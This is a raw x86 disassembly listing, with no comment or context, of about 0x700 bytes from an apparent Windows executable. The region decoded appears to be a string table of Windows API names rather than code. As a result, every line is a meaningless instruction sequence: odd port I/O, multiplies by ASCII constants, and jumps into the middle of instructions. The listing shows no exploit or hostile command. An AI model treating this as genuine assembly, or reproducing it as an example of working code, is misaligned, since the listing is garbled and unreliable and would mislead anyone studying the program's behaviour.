  413337:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  41333d:	jae    0x4133a0
  41333f:	addr16 gs inc ecx
  413342:	add    BYTE PTR [eax],al
  413344:	cmp    DWORD PTR [eax],eax
  413346:	inc    ebx
  413347:	push   0x70557261
  41334c:	jo     0x4133b3
  41334e:	jb     0x4133a7
  413350:	add    BYTE PTR [eax],al
  413352:	adc    eax,DWORD PTR [ecx]
  413354:	inc    edi
  413355:	gs je  0x41339c
  413358:	outs   dx,DWORD PTR ds:[esi]
  413359:	jne    0x4133bd
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	gs inc ebx
  41335e:	ins    BYTE PTR es:[edi],dx
  41335f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  413366:	add    BYTE PTR [eax],al
  413368:	mov    ds:0x57734901,eax
  41336d:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  413374:	jae    0x4133df
  413376:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41337a:	mov    esp,0x61724400
  41337f:	ja     0x4133d5
  413381:	gs js  0x4133f8
  413384:	push   edi
  413385:	add    BYTE PTR [ebp+0x61724400],dh
  41338b:	ja     0x4133da
  41338d:	outs   dx,BYTE PTR gs:[esi]
  41338f:	jne    0x4133d3
  413391:	popa   
  413392:	jb     0x413394
  413394:	jle    0x413397
  413396:	dec    eax
  413397:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  41339f:	jne    0x4133ea
  4133a1:	je     0x413408
  4133a3:	ins    DWORD PTR es:[edi],dx
  4133a4:	add    BYTE PTR [eax],al
  4133a6:	mov    al,BYTE PTR [edx]
  4133a8:	push   esp
  4133a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  4133b1:	ja     0x413426
  4133b3:	add    BYTE PTR [eax],ch
  4133b5:	add    BYTE PTR [ebx+0x68],al
  4133b8:	popa   
  4133b9:	jb     0x413407
  4133bb:	outs   dx,DWORD PTR ds:[esi]
  4133bc:	ja     0x413423
  4133be:	jb     0x413402
  4133c0:	jne    0x413428
  4133c2:	push   di
  4133c4:	add    BYTE PTR [eax],al
  4133c6:	bound  eax,QWORD PTR [eax]
  4133c8:	inc    ebx
  4133c9:	jb     0x413430
  4133cb:	popa   
  4133cc:	je     0x413433
  4133ce:	push   edi
  4133cf:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4133d6:	inc    ecx
  4133d7:	add    BYTE PTR [ebx+0x2],dh
  4133da:	push   ebx
  4133db:	gs je  0x413435
  4133de:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4133e5:	js     0x41345b
  4133e7:	inc    ecx
  4133e8:	add    BYTE PTR [eax],al
  4133ea:	pop    ecx
  4133eb:	add    dl,BYTE PTR [ebx+0x65]
  4133ee:	je     0x413442
  4133f0:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4133f5:	jo     0x41346b
  4133f7:	jns    0x4133f9
  4133f9:	add    bh,ah
  4133fb:	add    BYTE PTR [esi+0x72],al
  4133fe:	popa   
  4133ff:	ins    DWORD PTR es:[edi],dx
  413400:	gs push edx
  413402:	arpl   WORD PTR gs:[eax+eax*1+0x3b],si
  413407:	add    DWORD PTR [edi+0x65],eax
  41340a:	je     0x413459
  41340c:	gs jae 0x413482
  41340f:	popa   
  413410:	addr16 gs inc ebp
  413413:	js     0x413489
  413415:	jb     0x413478
  413417:	dec    ecx
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	outs   dx,WORD PTR ds:[esi]
  41341b:	add    BYTE PTR [eax+0x2],ch
  41341e:	push   ebx
  41341f:	gs je  0x413477
  413422:	jae    0x413489
  413424:	jb     0x413475
  413426:	bound  ebp,QWORD PTR [edx+0x65]
  413429:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41342d:	outs   dx,WORD PTR ds:[esi]
  41342f:	jb     0x41349e
  413431:	popa   
  413432:	je     0x41349d
  413434:	outs   dx,DWORD PTR ds:[esi]
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	push   edi
  413437:	add    BYTE PTR [ebx+0x73654400],dl
  41343d:	je     0x4134b1
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	jns    0x413483
  413442:	arpl   WORD PTR [ebx+0x65],sp
  413445:	ins    BYTE PTR es:[edi],dx
  413446:	gs jb  0x4134aa
  413449:	je     0x4134ba
  41344b:	jb     0x4134a1
  41344d:	popa   
  41344e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413452:	xor    al,BYTE PTR [ecx]
  413454:	inc    edi
  413455:	gs je  0x4134a5
  413458:	outs   dx,BYTE PTR gs:[esi]
  41345a:	jne    0x4134a5
  41345c:	je     0x4134c3
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	inc    ebx
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	jne    0x4134d1
  413463:	je     0x413465
  413465:	add    BYTE PTR [ebp+0x79656b02],bh
  41346b:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41346f:	jbe    0x4134d6
  413471:	outs   dx,BYTE PTR ds:[esi]
  413472:	je     0x413474
  413474:	call   0x65b1837a
  413479:	outs   dx,BYTE PTR ds:[esi]
  41347a:	dec    ecx
  41347b:	arpl   WORD PTR [edi+0x6e],bp
  41347e:	add    BYTE PTR [eax],al
  413480:	das    
  413481:	add    dl,BYTE PTR [ebx+0x65]
  413484:	je     0x4134c7
  413486:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41348a:	gs push edi
  41348c:	imul   ebp,DWORD PTR [esi+0x64],0x5f00776f
  413493:	add    dl,BYTE PTR [ebx+0x65]
  413496:	je     0x4134eb
  413498:	jns    0x41350d
  41349a:	inc    ebx
  41349b:	outs   dx,DWORD PTR ds:[esi]
  41349c:	ins    BYTE PTR es:[edi],dx
  41349d:	outs   dx,DWORD PTR ds:[esi]
  41349e:	jb     0x413513
  4134a0:	add    BYTE PTR [eax],al
  4134a2:	mov    dh,0x1
  4134a4:	dec    esp
  4134a5:	outs   dx,DWORD PTR ds:[esi]
  4134a6:	popa   
  4134a7:	fs dec ebp
  4134a9:	outs   dx,BYTE PTR gs:[esi]
  4134ab:	jne    0x4134ee
  4134ad:	add    BYTE PTR ds:0x61684300,ch
  4134b3:	jb     0x413503
  4134b5:	gs js  0x41352c
  4134b8:	push   edi
  4134b9:	add    dh,cl
  4134bb:	add    DWORD PTR [ebp+0x65],ecx
  4134be:	jae    0x413533
  4134c0:	popa   
  4134c1:	addr16 gs inc edx
  4134c4:	outs   dx,DWORD PTR ds:[esi]
  4134c5:	js     0x413508
  4134c7:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  4134ce:	jae    0x41353c
  4134d0:	popa   
  4134d1:	je     0x413538
  4134d3:	inc    ecx
  4134d4:	arpl   WORD PTR [ebx+0x65],sp
  4134d7:	ins    BYTE PTR es:[edi],dx
  4134d8:	gs jb  0x41353c
  4134db:	je     0x41354c
  4134dd:	jb     0x413536
  4134df:	add    BYTE PTR [ecx+0x66654400],cl
  4134e5:	inc    esi
  4134e6:	jb     0x413549
  4134e8:	ins    DWORD PTR es:[edi],dx
  4134e9:	gs push eax
  4134eb:	jb     0x41355c
  4134ed:	arpl   WORD PTR [ecx+0x0],ax
  4134f0:	test   DWORD PTR [edx],eax
  4134f2:	push   ebx
  4134f3:	jns    0x413568
  4134f5:	je     0x41355c
  4134f7:	ins    DWORD PTR es:[edi],dx
  4134f8:	push   eax
  4134f9:	popa   
  4134fa:	jb     0x41355d
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	gs je  0x413565
  413500:	jb     0x413575
  413502:	dec    ecx
  413503:	outs   dx,BYTE PTR ds:[esi]
  413504:	outs   dx,WORD PTR ds:[esi]
  413506:	inc    ecx
  413507:	add    BYTE PTR ds:0x67655202,al
  41350d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  413514:	popa   
  413515:	jae    0x41358a
  413517:	push   edi
  413518:	add    BYTE PTR [eax],al
  41351a:	iret   
  41351b:	add    DWORD PTR [ebp+0x65],ecx
  41351e:	jae    0x413593
  413520:	popa   
  413521:	addr16 gs inc edx
  413524:	outs   dx,DWORD PTR ds:[esi]
  413525:	js     0x41356c
  413527:	js     0x41356a
  413529:	add    BYTE PTR [ecx],ch
  41352b:	add    BYTE PTR [ebx+0x68],al
  41352e:	popa   
  41352f:	jb     0x41357d
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	ja     0x413599
  413534:	jb     0x41358d
  413536:	add    BYTE PTR [eax],al
  413538:	pushf  
  413539:	add    BYTE PTR [ecx+ebp*2+0x61],al
  41353d:	ins    BYTE PTR es:[edi],dx
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	addr16 inc edx
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	js     0x413594
  413544:	popa   
  413545:	jb     0x4135a8
  413547:	ins    DWORD PTR es:[edi],dx
  413548:	inc    ecx
  413549:	add    BYTE PTR [esi],bh
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x41359d
  413550:	gs jae 0x4135c6
  413553:	popa   
  413554:	addr16 gs push edi
  413557:	add    BYTE PTR [edi+0x2],dl
  41355a:	push   ebx
  41355b:	gs je  0x4135ae
  41355e:	jb     0x4135cf
  413560:	jo     0x4135b9
  413562:	add    BYTE PTR [eax],al
  413564:	loope  0x413566
  413566:	inc    esi
  413567:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41356e:	outs   dx,DWORD PTR ds:[esi]
  41356f:	ja     0x4135b2
  413571:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  413578:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x6f43004a
  413580:	jo     0x4135fb
  413582:	inc    ecx
  413583:	arpl   WORD PTR [ebx+0x65],sp
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	gs jb  0x4135eb
  41358a:	je     0x4135fb
  41358c:	jb     0x4135e2
  41358e:	popa   
  41358f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  413593:	add    cl,al
  413595:	add    BYTE PTR [ebp+0x6e],al
  413598:	popa   
  413599:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41359d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4135a4:	pop    edx
  4135a5:	add    dl,BYTE PTR [ebx+0x65]
  4135a8:	je     0x4135fd
  4135aa:	arpl   WORD PTR [edx+0x6f],si
  4135ad:	ins    BYTE PTR es:[edi],dx
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	dec    ecx
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,WORD PTR ds:[esi]
  4135b3:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4135ba:	push   ebx
  4135bb:	je     0x41362f
  4135bd:	imul   ebp,DWORD PTR [esi+0x67],0x350057
  4135c4:	inc    ebx
  4135c5:	push   0x6f547261
  4135ca:	dec    edi
  4135cb:	gs ins DWORD PTR es:[edi],dx
  4135cd:	push   edi
  4135ce:	add    BYTE PTR [eax],al
  4135d0:	inc    BYTE PTR [eax]
  4135d2:	inc    edi
  4135d3:	gs je  0x413619
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4135de:	jb     0x4135e0
  4135e0:	dec    edx
  4135e1:	add    dl,BYTE PTR [ebx+0x65]
  4135e4:	je     0x413633
  4135e6:	outs   dx,BYTE PTR gs:[esi]
  4135e8:	jne    0x41362e
  4135ea:	gs popaw 
  4135ed:	jne    0x41365b
  4135ef:	je     0x41363a
  4135f1:	je     0x413658
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	add    BYTE PTR [eax],al
  4135f6:	mov    DWORD PTR [ecx],eax
  4135f8:	dec    ecx
  4135f9:	outs   dx,BYTE PTR ds:[esi]
  4135fa:	jbe    0x41365d
  4135fc:	ins    BYTE PTR es:[edi],dx
  4135fd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  413605:	je     0x413607
  413607:	add    BYTE PTR [ecx+0x616f4c01],ch
  41360d:	fs inc edx
  41360f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x15004170
  413617:	add    DWORD PTR [edi+0x65],eax
  41361a:	je     0x413662
  41361c:	outs   dx,DWORD PTR ds:[esi]
  41361d:	jb     0x413684
  41361f:	addr16 jb 0x413691
  413622:	jne    0x413692
  413624:	fs push edi
  413626:	imul   ebp,DWORD PTR [esi+0x64],0xb800776f
  41362d:	add    BYTE PTR [edx+esi*2+0x61],al
  413631:	ja     0x413686
  413633:	je     0x413696
  413635:	je     0x41369c
  413637:	push   edi
  413638:	add    BYTE PTR [eax],al
  41363a:	xchg   ebx,eax
  41363b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	jae    0x4136ae
  413642:	popa   
  413643:	je     0x4136aa
  413645:	inc    ecx
  413646:	arpl   WORD PTR [ebx+0x65],sp
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	gs jb  0x4136ae
  41364d:	je     0x4136be
  41364f:	jb     0x413692
  413651:	add    BYTE PTR [eax+0x57734901],ah
  413657:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41365e:	and    eax,0x6e655302
  413663:	fs dec ecx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	jo     0x4136dd
  413668:	je     0x41366a
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	add    DWORD PTR [ebx+0x69],ecx
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	ins    BYTE PTR es:[edi],dx
  413670:	push   esp
  413671:	imul   ebp,DWORD PTR [ebp+0x65],0x1b10072
  413678:	dec    esp
  413679:	outs   dx,DWORD PTR ds:[esi]
  41367a:	popa   
  41367b:	fs dec ecx
  41367d:	ins    DWORD PTR es:[edi],dx
  41367e:	popa   
  41367f:	addr16 gs inc ecx
  413682:	add    BYTE PTR [eax],al
  413684:	daa    
  413685:	add    DWORD PTR [edi+0x65],eax
  413688:	je     0x4136d5
  41368a:	gs jns 0x4136ef
  41368d:	outs   dx,DWORD PTR ds:[esi]
  41368e:	popa   
  41368f:	jb     0x4136f5
  413691:	push   esp
  413692:	jns    0x413704
  413694:	add    BYTE PTR gs:[ebx+0x61724400],dh
  41369b:	ja     0x4136e6
  41369d:	arpl   WORD PTR [edi+0x6e],bp
  4136a0:	add    BYTE PTR [eax],al
  4136a2:	mov    BYTE PTR [edx],al
  4136a4:	push   esp
  4136a5:	popa   
  4136a6:	bound  esp,QWORD PTR [edx+0x65]
  4136a9:	fs push esp
  4136ab:	gs js  0x413722
  4136ae:	dec    edi
  4136af:	jne    0x413725
  4136b1:	push   edi
  4136b2:	add    BYTE PTR [eax],al
  4136b4:	push   0x74654701
  4136b9:	push   edi
  4136ba:	imul   ebp,DWORD PTR [esi+0x64],0x8200776f
  4136c1:	add    DWORD PTR [ecx+0x6e],ecx
  4136c4:	data16 ins BYTE PTR es:[edi],dx
  4136c6:	popa   
  4136c7:	je     0x41372e
  4136c9:	push   edx
  4136ca:	arpl   WORD PTR gs:[eax+eax*1-0x2b],si
  4136cf:	add    DWORD PTR [ebp+0x65],ecx
  4136d2:	jae    0x413747
  4136d4:	popa   
  4136d5:	addr16 gs inc edx
  4136d8:	outs   dx,DWORD PTR ds:[esi]
  4136d9:	js     0x413732
  4136db:	add    BYTE PTR [eax],bh
  4136dd:	add    dl,BYTE PTR [ebx+0x65]
  4136e0:	je     0x413725
  4136e2:	jne    0x413756
  4136e4:	jae    0x413755
  4136e6:	jb     0x4136e8
  4136e8:	mov    es,WORD PTR [edx]
  4136ea:	push   esp
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	push   ebp
  4136ed:	outs   dx,BYTE PTR ds:[esi]
  4136ee:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  4136f5:	add    BYTE PTR [esi+0x52734901],bl
  4136fb:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  413700:	jo     0x413776
  413702:	jns    0x413704
  413704:	clc    
  413705:	add    BYTE PTR [edi+0x65],al
  413708:	je     0x41374d
  41370a:	ins    BYTE PTR es:[edi],dx
  41370b:	popa   
  41370c:	jae    0x413781
  41370e:	dec    esp
  41370f:	outs   dx,DWORD PTR ds:[esi]
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	addr16 inc ecx
  413713:	add    BYTE PTR [ecx+0x57734901],ah
  413719:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  413720:	popa   
  413721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  413725:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41372c:	arpl   WORD PTR [eax+0x54],bp
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	push   esp
  413731:	push   0x69577369
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	outs   dx,DWORD PTR fs:[esi]
  413739:	ja     0x41373b
  41373b:	add    BYTE PTR [ebx],cl
  41373d:	add    DWORD PTR [edi+0x65],eax
  413740:	je     0x413786
  413742:	inc    ebx
  413743:	inc    ebp
  413744:	js     0x413746
  413746:	stos   DWORD PTR es:[edi],eax
  413747:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41374b:	fs inc ebx
  41374d:	jne    0x4137c1
  41374f:	jae    0x4137c0
  413751:	jb     0x413794
  413753:	add    BYTE PTR [edx+0x766e4901],cl
  413759:	popa   
  41375a:	ins    BYTE PTR es:[edi],dx
  41375b:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  413763:	add    BYTE PTR [edx+0x57734901],ah
  413769:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  413770:	imul   esp,DWORD PTR [ebx+0x6f],0xe4006564
  413777:	add    DWORD PTR [edi+0x66],ecx
  41377a:	data16 jae 0x4137e2
  41377d:	je     0x4137d1
  41377f:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413784:	cmp    eax,0x65684300
  413789:	arpl   WORD PTR [ebx+0x52],bp
  41378c:	popa   
  41378d:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	add    BYTE PTR [eax],al
  413798:	adc    eax,DWORD PTR [edx]
  41379a:	push   edx
  41379b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  4137a4:	outs   dx,BYTE PTR ds:[esi]
  4137a5:	outs   dx,DWORD PTR fs:[esi]
  4137a7:	ja     0x4137f6
  4137a9:	gs jae 0x41381f
  4137ac:	popa   
  4137ad:	addr16 gs push edi
  4137b0:	add    BYTE PTR [eax],al
  4137b2:	or     al,BYTE PTR [edx]
  4137b4:	push   edx
  4137b5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  4137be:	je     0x41380b
  4137c0:	gs jns 0x4137c3
  4137c3:	add    BYTE PTR [eax+0x746e4901],cl
  4137c9:	gs jb  0x41383f
  4137cc:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  4137d1:	arpl   WORD PTR [eax+eax*1-0x17],si
  4137d5:	add    DWORD PTR [edi+0x70],ecx
  4137d8:	outs   dx,BYTE PTR gs:[esi]
  4137da:	dec    ecx
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	jo     0x413853
  4137de:	je     0x413824
  4137e0:	gs jae 0x41384e
  4137e3:	je     0x413854
  4137e5:	jo     0x4137e7
  4137e7:	add    BYTE PTR [edx],al
  4137e9:	add    dl,BYTE PTR [edx+0x65]
  4137ec:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4137f4:	popa   
  4137f5:	jae    0x41386a
  4137f7:	inc    ecx
  4137f8:	add    BYTE PTR [eax],al
  4137fa:	jno    0x4137fe
  4137fc:	push   ebx
  4137fd:	gs je  0x413857
  413800:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  413807:	outs   dx,BYTE PTR ds:[esi]
  413808:	add    BYTE PTR [eax],al
  41380a:	mov    ecx,0x616f4c01
  41380f:	fs dec ebp
  413811:	outs   dx,BYTE PTR gs:[esi]
  413813:	jne    0x41386c
  413815:	add    BYTE PTR ds:0x74654701,ch
  41381b:	dec    ebp
  41381c:	outs   dx,BYTE PTR gs:[esi]
  41381e:	jne    0x413863
  413820:	push   0x4d6b6365
  413825:	popa   
  413826:	jb     0x413893
  413828:	inc    esp
  413829:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413830:	outs   dx,BYTE PTR ds:[esi]
  413831:	jae    0x413833
  413833:	add    BYTE PTR [esi+0x66654400],cl
  413839:	push   edi
  41383a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	arpl   WORD PTR [ecx+0x0],ax
  413845:	add    BYTE PTR [ebx],al
  413847:	add    BYTE PTR [ecx+0x64],al
  41384a:	push   0x75
  41384c:	jae    0x4138c2
  41384e:	push   edi
  41384f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413856:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    eax,0x6c6c4100
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	ja     0x4138b7
  413864:	gs je  0x4138ad
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	jb     0x4138cf
  41386a:	addr16 jb 0x4138dc
  41386d:	jne    0x4138dd
  41386f:	fs push edi
  413871:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413878:	ja     0x41387b
  41387a:	inc    edi
  41387b:	gs je  0x4138d5
  41387e:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  413885:	js     0x4138fb
  413887:	dec    esp
  413888:	outs   dx,BYTE PTR gs:[esi]
  41388a:	addr16 je 0x4138f5
  41388d:	push   edi
  41388e:	add    BYTE PTR [eax],al
  413890:	pushf  
  413891:	add    DWORD PTR [ecx+0x73],ecx
  413894:	dec    ecx
  413895:	arpl   WORD PTR [edi+0x6e],bp
  413898:	imul   esp,DWORD PTR [ebx+0x0],0x53024e00
  41389f:	gs je  0x4138ef
  4138a2:	outs   dx,BYTE PTR gs:[esi]
  4138a4:	jne    0x4138ef
  4138a6:	je     0x41390d
  4138a8:	ins    DWORD PTR es:[edi],dx
  4138a9:	dec    ecx
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	outs   dx,WORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	add    BYTE PTR [eax],al
  4138b0:	dec    eax
  4138b1:	add    dl,BYTE PTR [ebx+0x65]
  4138b4:	je     0x413903
  4138b6:	outs   dx,BYTE PTR gs:[esi]
  4138b8:	jne    0x4138ba
  4138ba:	inc    esp
  4138bb:	add    BYTE PTR [ebx+0x6c],al
  4138be:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4138c5:	jb     0x4138c7
  4138c7:	add    cl,al
  4138c9:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  4138cd:	imul   esi,DWORD PTR [ebp+0x70],0x49
  4138d1:	arpl   WORD PTR [edi+0x6e],bp
  4138d4:	dec    ecx
  4138d5:	fs inc esi
  4138d7:	jb     0x413948
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	inc    esp
  4138db:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4138e2:	jns    0x4138e4
  4138e4:	add    BYTE PTR ss:[ebx+0x68],al
  4138e8:	popa   
  4138e9:	jb     0x413940
  4138eb:	jo     0x41395d
  4138ed:	gs jb  0x413931
  4138f0:	add    BYTE PTR [eax],al
  4138f2:	mov    edi,0x636f4c01
  4138f7:	imul   edx,DWORD PTR [edi+0x69],0x6e
  4138fb:	outs   dx,DWORD PTR fs:[esi]
  4138fd:	ja     0x413954
  4138ff:	jo     0x413965
  413901:	popa   
  413902:	je     0x413969
  413904:	add    BYTE PTR [eax],al
  413906:	cmp    BYTE PTR [ecx],al
  413908:	inc    edi
  413909:	gs je  0x413959
  41390c:	outs   dx,BYTE PTR gs:[esi]
  41390e:	jne    0x413963
  413910:	je     0x413984
  413912:	imul   ebp,DWORD PTR [esi+0x67],0xc9000041
  413919:	add    DWORD PTR [ebp+0x61],ecx
  41391c:	jo     0x413975
  41391e:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413925:	imul   ebp,DWORD PTR [esi+0x74],0x1620073
  41392c:	inc    edi
  41392d:	gs je  0x413984
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	jo     0x41398a
  413933:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41393a:	pop    ecx
  41393b:	add    BYTE PTR [ebx+0x72],al
  41393e:	gs popa 
  413940:	je     0x4139a7
  413942:	inc    esp
  413943:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41394a:	jb     0x4139ad
  41394c:	ins    DWORD PTR es:[edi],dx
  41394d:	push   edi
  41394e:	add    BYTE PTR [eax],al
  413950:	inc    edx
  413951:	add    DWORD PTR [edi+0x65],eax
  413954:	je     0x4139a4
  413956:	gs js  0x4139cd
  413959:	inc    esp
  41395a:	ins    BYTE PTR es:[edi],dx
  41395b:	addr16 inc edi
  41395d:	jb     0x4139ce
  41395f:	jne    0x4139d1
  413961:	dec    ecx
  413962:	je     0x4139c9
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	add    bl,bh
  413967:	add    DWORD PTR [eax+0x74],edx
  41396a:	dec    ecx
  41396b:	outs   dx,BYTE PTR ds:[esi]
  41396c:	push   edx
  41396d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413972:	push   ebp
  413973:	push   ebx
  413974:	inc    ebp
  413975:	push   edx
  413976:	xor    esi,DWORD PTR [edx]
  413978:	cs fs ins BYTE PTR es:[edi],dx
  41397b:	ins    BYTE PTR es:[edi],dx
  41397c:	add    BYTE PTR [eax],al
  41397e:	jns    0x4139c5
  413980:	pop    ecx
  413981:	je     0x4139cb
  413983:	push   ebp
  413984:	jp     0x4139f2
  413986:	jae    0x4139f8
  413988:	push   ecx
  413989:	dec    edx
  41398a:	push   0x47
  41398c:	jne    0x4139d4
  41398e:	fidivr WORD PTR ds:0x3de60041
  413994:	inc    ecx
  413995:	add    dh,dl
  413997:	cmp    eax,DWORD PTR [ecx+0x0]
  41399a:	out    dx,al
  41399b:	or     esi,DWORD PTR [edx+0x3a4f7d0e]
  4139a1:	dec    edi
  4139a2:	ja     0x4139f3
  4139a4:	cmp    DWORD PTR [edi+0x4f],ecx
  4139a7:	dec    edi
  4139a8:	cmp    al,0x4f
  4139aa:	jb     0x4139fb
  4139ac:	xor    ecx,DWORD PTR [edi+0x5e]
  4139af:	dec    edi
  4139b0:	ss dec edi
  4139b2:	jnp    0x413a03
  4139b4:	xor    eax,0x2a4f3a4f
  4139b9:	dec    edi
  4139ba:	push   ds
  4139bb:	push   edx
  4139bc:	pop    ds
  4139bd:	push   ebx
  4139be:	cmp    eax,0x3a4f7d4f
  4139c3:	dec    edi
  4139c4:	ja     0x413a15
  4139c6:	cmp    DWORD PTR [edi+0x4f],ecx
  4139c9:	dec    edi
  4139ca:	cmp    al,0x4f
  4139cc:	jb     0x413a1d
  4139ce:	xor    ecx,DWORD PTR [edi+0x5e]
  4139d1:	dec    edi
  4139d2:	ss dec edi
  4139d4:	ins    DWORD PTR es:[edi],dx
  4139d5:	dec    edi
  4139d6:	xor    eax,0x2a4f3a4f
  4139db:	dec    edi
  4139dc:	push   ds
  4139dd:	bound  ebx,QWORD PTR [edi]
  4139df:	arpl   WORD PTR ds:0x3a4f7d4f,di
  4139e5:	dec    edi
  4139e6:	push   0x4f
  4139e8:	cmp    DWORD PTR [edi+0x7b],ecx
  4139eb:	dec    edi
  4139ec:	cmp    eax,0x304f484f
  4139f1:	dec    edi
  4139f2:	cmp    cl,BYTE PTR [edi+0x34]
  4139f5:	dec    edi
  4139f6:	push   ds
  4139f7:	jb     0x413a18
  4139f9:	jae    0x413a0a
  4139fb:	or     DWORD PTR [eax+eax*4],0x7c
  4139ff:	nop
  413a00:	jge    0x413993
  413a02:	aas    
  413a03:	dec    edi
  413a04:	jbe    0x413a55
  413a06:	cmp    cl,BYTE PTR [edi+0x76]
  413a09:	dec    edi
  413a0a:	ds dec edi
  413a0c:	dec    eax
  413a0d:	dec    edi
  413a0e:	cmp    eax,0x314f7b4f
  413a13:	dec    edi
  413a14:	cmp    cl,BYTE PTR [edi+0x36]
  413a17:	dec    edi
  413a18:	push   ds
  413a19:	sbb    BYTE PTR [edi],0x83
  413a1c:	setae  BYTE PTR [eax+edx*4]
  413a20:	jl     0x4139c2
  413a22:	jge    0x4139c5
  413a24:	aas    
  413a25:	dec    edi
  413a26:	jbe    0x413a77
  413a28:	cmp    cl,BYTE PTR [edi+0x76]
  413a2b:	dec    edi
  413a2c:	ds dec edi
  413a2e:	dec    eax
  413a2f:	dec    edi
  413a30:	cmp    eax,0x314f6d4f
  413a35:	dec    edi
  413a36:	cmp    cl,BYTE PTR [edi+0x36]
  413a39:	dec    edi
  413a3a:	push   ds
  413a3b:	xchg   edx,eax
  413a3c:	pop    ds
  413a3d:	xchg   ebx,eax
  413a3e:	bt     DWORD PTR [eax+eiz*4],ecx
  413a42:	jl     0x4139f4
  413a44:	jge    0x4139f7
  413a46:	aas    
  413a47:	dec    edi
  413a48:	ins    BYTE PTR es:[edi],dx
  413a49:	dec    edi
  413a4a:	cmp    cl,BYTE PTR [edi+0x4e]
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x7b],ecx
  413a51:	dec    edi
  413a52:	cmp    eax,0x304f554f
